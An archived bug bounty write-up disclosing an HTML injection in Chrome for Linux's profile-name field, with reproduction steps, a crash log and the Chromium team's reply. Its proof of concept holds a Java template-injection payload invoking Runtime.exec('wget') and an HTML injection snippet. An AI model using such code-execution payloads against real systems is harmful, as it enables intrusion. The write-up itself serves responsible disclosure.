---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-17_html-injection-and-a-dream-in-google-chrome-for-linux-write-up.md
original_filename: 2021-06-17_html-injection-and-a-dream-in-google-chrome-for-linux-write-up.md
title: HTML Injection and a dream in Google Chrome for Linux (Write Up)
category: documents
detected_topics:
- ssrf
- xss
- command-injection
- otp
tags:
- imported
- documents
- ssrf
- xss
- command-injection
- otp
language: en
raw_sha256: 525972022ba92195a3711d06c83be81013fa1f82c39ad5af22e9716c815eca99
text_sha256: 6a6aa7df8c62f033c6ebb7aeb6feaa7820d1c6da21b773abd9b7ec40aed03545
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# HTML Injection and a dream in Google Chrome for Linux (Write Up)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-17_html-injection-and-a-dream-in-google-chrome-for-linux-write-up.md
- Source Type: markdown
- Detected Topics: ssrf, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `525972022ba92195a3711d06c83be81013fa1f82c39ad5af22e9716c815eca99`
- Text SHA256: `6a6aa7df8c62f033c6ebb7aeb6feaa7820d1c6da21b773abd9b7ec40aed03545`


## Content

---
title: "HTML Injection and a dream in Google Chrome for Linux (Write Up)"
page_title: "Evan Ricafort | Blog: HTML Injection and a dream in Google Chrome for Linux (Write Up)"
url: "https://blog.evanricafort.com/2021/06/html-injection-and-a-dream.html"
final_url: "https://blog.evanricafort.com/2021/06/html-injection-and-a-dream.html"
authors: ["Evan Ricafort (@evanricafort)"]
programs: ["Google"]
bugs: ["HTML injection"]
publication_date: "2021-06-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3566
---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVKST4fRCBZLf0lkpDriAE3yTNnzwRyL3kQyhg8C2Vn4qxyVs6cCGD0H5gezioETRnp-_jTy1NMRIlt7V6nsIVAmJrggjGRlbTGkGLQD-6q-CCLtKZY9FrtroA1VW1A1bm5ooWzJxB/w640-h360/htmlinjection.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVKST4fRCBZLf0lkpDriAE3yTNnzwRyL3kQyhg8C2Vn4qxyVs6cCGD0H5gezioETRnp-_jTy1NMRIlt7V6nsIVAmJrggjGRlbTGkGLQD-6q-CCLtKZY9FrtroA1VW1A1bm5ooWzJxB/s1919/htmlinjection.png)

  

Henlooo...

  

In this writeup I will show you a simple vulnerability that I found few days ago on Google Chrome Version 91.0.4472.101 for Linux.

The vulnerability is not remotely exploitable since the attacker needs an access on victim's user credentials and physical access on his device. This kind of issue is not acceptable on Google bug bounty program since physically-local attacks are not in Chrome’s threat model.

I asked my friend for help about this issue and we did some research on it, we tried to exploit the vulnerability to trigger something bigger than HTML Injection but after a long hours of figuring out how to make it a good bug (we aim for RCE), we found nothing.

So I spend hours reading RCE related writeups on the internet and found this cool [writeup](https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae) from [Gaurav Mishra](https://twitter.com/gmishra010) which he mentioned the payload he used for his SSRF bug. I tried using his payload and something happened. The browser crashed instantly after the payload executes. I asked my friend if he has a Burp Pro to try using the Burp Collaborator for some SSRF stuff but he said he is also using Burp Community edition. so we ended up reporting this issue instead of continuing the research since also in my mind it will not qualify because as what I have mentioned, it requires access to victim's user credentials and device to reproduce this issue. 

  

 _**\--Proof of Concept--**_

1\. Open Google Chrome for Linux (I used Kali Linux)  
2\. Login your account to your Google Chrome account  
3\. After you login to your account, click your account profile/avatar in the upper right corner of your chrome browser  
4\. Click the Customize Profile button next to your avatar  
5\. Input the payload in the Name your Chrome profile  
Payload: ${("".getClass()).forName("java.lang".concat("Runtime")).getMethods()[6].invoke(("".getClass()).forName("java.lang".concat("Runtime"))).exec("wget")}  
  
and this one if you try HTML Injection: <font color="green"><h1>HTML Injection Vulnerability</h1></font><br /><i>found by @evanricafort</i>  
6\. Now open terminal and type google-chrome or click your profile again in the upper right corner of the browser and then click the + Add button in the Other profile section  
7\. A new tab will popup and now click + Add  
8\. Input any name on it and click Done  
9\. Click the Already a Chrome user? Sign in below the Get Started button  
10\. Login to your account again (same account you login on step 2) and see the result  
  

  
FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION  
Type of crash: Browser  
Crash State:  
  
root@evanricafort:~# google-chrome  
libva error: vaGetDriverNameByIndex() failed with unknown libva error, driver_name = (null)  
[36540:36540:0614/235457.931329:ERROR:viz_main_impl.cc(160)] Exiting GPU process due to errors during initialization  
[36591:36591:0614/235457.961095:ERROR:gpu_init.cc(440)] Passthrough is not supported, GL is swiftshader  
[36510:36510:0614/235528.443094:ERROR:account_info_fetcher.cc(62)] OnGetTokenFailure: Request canceled.  
Will not apply HSTS. The HSTS database must be a regular and non-world-writable file.  
ERROR: could not open HSTS store at '/root/.wget-hsts'. HSTS will be disabled.  
\--2021-06-14 23:55:28-- https://clients2.google.com/cr/report  
Resolving clients2.google.com (clients2.google.com)... 172.217.161.142, 2404:6800:4005:813::200e  
Connecting to clients2.google.com (clients2.google.com)|172.217.161.142|:443... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: unspecified [text/plain]  
Saving to: ‘/dev/fd/4’  
0K 10.9M=0s  
  
Crash dump id: 84b1ebfc0c559df4  
2021-06-14 23:55:30 (10.9 MB/s) - ‘/dev/fd/4’ saved [16]  
Will not apply HSTS. The HSTS database must be a regular and non-world-writable file.  
ERROR: could not open HSTS store at '/root/.wget-hsts'. HSTS will be disabled.  
\--2021-06-14 23:55:30-- https://clients2.google.com/cr/report  
Resolving clients2.google.com (clients2.google.com)... 216.58.220.206, 2404:6800:4005:81b::200e  
Connecting to clients2.google.com (clients2.google.com)|216.58.220.206|:443... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: unspecified [text/plain]  
Saving to: ‘/dev/fd/4’  
Crash dump id: ffe8ac349204a557  
Illegal instruction  
root@evanricafort:~# [0614/235532.220447:ERROR:nacl_helper_linux.cc(307)] NaCl helper process running without a sandbox!  
Most likely you need to configure your SUID sandbox correctly

  

  

  

  

  

  

 _**\--Timeline--**_

**_  
_**

Reported: June 15, 2021

Public Disclosure: June 17, 2021  

  

Here's one of the response of Chromium team

  

  

 __

> _An attacker must have access to the user's browser to modify a profile name. I don't think this is a security issue since this bug cannot be exploited remotely. Physically-local attacks are not in Chrome’s threat model [1]._
> 
> _  
> _
> 
> _This issue still needs to be fixed, though. I'll look into escaping the profile name before displaying it in web contents._

So that is all for this writeup. Stay safe and happy hacking everyone!

  

_**"The future belongs to those who believe in the beauty of their dreams."**_

_― Eleanor Roosevelt_

 __
